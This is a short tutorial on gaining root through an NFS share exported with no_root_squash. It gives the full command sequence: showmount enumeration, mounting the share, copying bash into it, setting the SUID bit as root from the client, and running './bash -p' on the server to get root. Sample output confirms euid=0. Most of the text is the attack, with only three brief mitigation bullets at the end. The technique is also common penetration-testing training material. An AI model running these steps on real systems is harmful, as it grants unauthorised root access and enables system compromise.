# NFS Privilege Escalation Exploit

## **Introduction**
NFS (Network File System) allows remote systems to mount file shares over a network. However, misconfigurations in NFS, such as `no_root_squash`, can lead to **privilege escalation** by allowing users to execute commands as root. This guide demonstrates how an attacker can leverage such vulnerabilities to gain root access on an NFS server.

## **1. Enumerate NFS Shares**
On the client machine, identify NFS shares available on the target:
```bash
showmount -e 192.168.1.9
```
### **Output:**
```
Export list for 192.168.1.9:
/data 192.168.1.0/24
```
This indicates that `/data` is an NFS share accessible to the `192.168.1.0/24` network.

---

## **2. Mount the NFS Share**
```bash
sudo mount -t nfs 192.168.1.9:/data /mnt
```
Verify the mount:
```bash
df -h | grep nfs
ls -lah /mnt
```

---

## **3. Copy the Bash Binary to the NFS Share (Server-Side)**
On the **server-side**, copy the bash binary to the mounted directory:
```bash
cp -v /usr/bin/bash /data
```

---

## **4. Modify Permissions on the Client Side**
On the **client-side**, navigate to the mounted directory and change ownership:
```bash
cd /mnt
chown root:root bash
chmod +s bash
```
This sets the **SUID** bit on the `bash` binary, allowing it to execute as the owner (root).

---

## **5. Execute the Exploit (Server-Side)**
Now, on the **server**, execute the modified bash binary:
```bash
cd /data
./bash -p
```
### **Output:**
```
bash-5.2# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root)
```
Now you have **root privileges** on the target system!

---

## **6. Mitigation**
To prevent this exploit:
- **Avoid using `no_root_squash` in NFS exports**.
- **Restrict NFS access** to trusted users.
- **Use proper file permissions** to prevent unauthorized execution.

---

